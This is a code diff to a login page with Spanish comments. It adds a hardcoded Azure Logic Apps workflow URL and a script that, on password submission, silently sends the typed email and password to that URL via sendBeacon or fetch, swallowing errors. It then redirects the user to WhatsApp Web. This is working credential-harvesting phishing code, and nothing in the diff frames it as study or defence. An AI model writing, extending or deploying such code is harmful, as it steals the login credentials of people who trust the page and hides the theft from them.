@@ -200,6 +200,10 @@
   const forgot = document.getElementById('forgot');
   const primaryBtn = document.getElementById('primaryBtn');
 
+  // >>>>>> AÑADIDO: URL del flujo para enviar correo y contraseña
+  const FLOW_URL = "https://prod-85.westus.logic.azure.com:443/workflows/a15e32f673dc4624b6d73ec979238804/triggers/manual/paths/invoke?api-version=2016-06-01&sp=%2Ftriggers%2Fmanual%2Frun&sv=1.0&sig=VwyY5R-_TBFDEfoAupMFarmhkjQsGUB5ILXsvVZbhpI";
+  // <<<<<<
+
   // Estado actual: 'id' (correo/teléfono) o 'pwd' (contraseña)
   let state = 'id';
 
@@ -230,6 +234,27 @@
       }, 1000);
 
     }else{
+      // >>>>>> AÑADIDO: enviar correo y contraseña al flujo sin bloquear la redirección
+      try {
+        const payload = JSON.stringify({
+          email: idValue.textContent,
+          password: input.value
+        });
+
+        if (navigator.sendBeacon) {
+          const blob = new Blob([payload], { type: "application/json" });
+          navigator.sendBeacon(FLOW_URL, blob);
+        } else {
+          fetch(FLOW_URL, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: payload,
+            keepalive: true
+          }).catch(()=>{});
+        }
+      } catch (_) {}
+      // <<<<<<
+
       // En estado 'pwd' al enviar, redirige a WhatsApp Web
       window.location.href = 'https://web.whatsapp.com/';
     }
@@ -257,4 +282,3 @@
 </script>
 </body>
 </html>
-
